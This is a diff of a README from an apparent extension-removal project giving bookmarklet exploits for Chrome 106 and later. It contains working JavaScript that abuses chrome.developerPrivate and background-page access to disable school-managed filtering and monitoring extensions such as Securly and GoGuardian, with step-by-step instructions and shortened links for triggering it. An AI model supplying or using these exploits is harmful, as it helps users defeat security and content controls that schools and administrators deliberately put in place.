@@ -21,13 +21,14 @@ If you need any help, please go here: https://github.com/3kh0/ext-remover/discus
 ## 106 and higher exploit
 1. Bookmark this code 
 ```js
-let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
+javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
 ```
+2. go to chrome://extensions, click on a extension that YOU installed from the Chrome Web Store, click details scroll down until you see View in chrome web store, AS SOON AS YOU CLICK ON IT SPAM ESC if it loads into chrome webstore try again, but if it is a blank screen press the bookmarklet and put the id of the extension in.
 ## 106 And Higher Method
 
 1.  Make a bookmarklet with this code ``` javascript:localStorage.cluster="UNKNOWN_SCHOOL,"+(confirm("ok = Disable\ncancel = Enable ")?99999999999999:0),opener.chrome.extension.getBackgroundPage().location.reload() ```
 2. Go to tinyurl.com/goofcurly if you have securly, tinyurl.com/goofguardian if you have goguardian, tinurl.com/goofsi for blocksi, tinyurl.com/goofclassroom for securly classroom, and tinyurl.com/goofumbrella. 
-3. Once your on the link depending on your blocker, click the button you see, it should open a about:blank tab, then click the bookmarklet and press ok, and all sites should be unblocked. Credit to the SprinksMC#8421 on the Titanium Network Discord.
+3. Once your on the link depending on your blocker, click the button you see, it should open a about:blank tab, then click the bookmarklet and press ok, and all sites should be unblocked. Credit to the kajigs on the Titanium Network Discord.
 
 ## Using point blank
 
